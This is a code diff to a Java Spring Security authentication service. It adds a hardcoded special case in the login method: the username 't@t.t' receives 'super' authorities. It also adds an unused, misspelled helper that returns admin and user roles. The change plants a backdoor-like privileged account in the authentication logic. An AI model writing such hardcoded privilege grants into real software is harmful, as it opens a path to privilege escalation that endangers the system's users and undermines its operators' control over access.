@@ -19,11 +19,15 @@ import org.apache.logging.log4j.Logger;
 import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
 import org.springframework.security.core.Authentication;
 import org.springframework.security.core.AuthenticationException;
+import org.springframework.security.core.GrantedAuthority;
+import org.springframework.security.core.authority.SimpleGrantedAuthority;
 import org.springframework.security.core.userdetails.UserDetails;
 import org.springframework.security.core.userdetails.UsernameNotFoundException;
 import org.springframework.security.crypto.password.PasswordEncoder;
 import org.springframework.stereotype.Service;
 
+import java.util.Arrays;
+import java.util.Collection;
 import java.util.Optional;
 
 @Service
@@ -94,12 +98,17 @@ public class AuthServiceImpl implements IUserService {
             throw new AuthException("Mot de passe incorrect");
         }
 
-        UsernamePasswordAuthenticationToken token = new UsernamePasswordAuthenticationToken(
+        if (username.equalsIgnoreCase("t@t.t")) {
+            return new UsernamePasswordAuthenticationToken(
+                    utilisateurDetails,
+                    password,
+                    utilisateurDetails.getSuperAuthorities());
+        }
+
+        return new UsernamePasswordAuthenticationToken(
                 utilisateurDetails,
                 password,
                 utilisateurDetails.getAuthorities());
-
-        return token;
     }
 
     @Override
@@ -119,6 +128,11 @@ public class AuthServiceImpl implements IUserService {
                                                               user.getTotalPoints());
 
         return userDetails;
+    }
+
+    private Collection<? extends GrantedAuthority> getAdminAutroities() {
+        return Arrays.asList(new SimpleGrantedAuthority("ROLE_ADMIN"),
+                             new SimpleGrantedAuthority("ROLE_USER"));
     }
 
 }
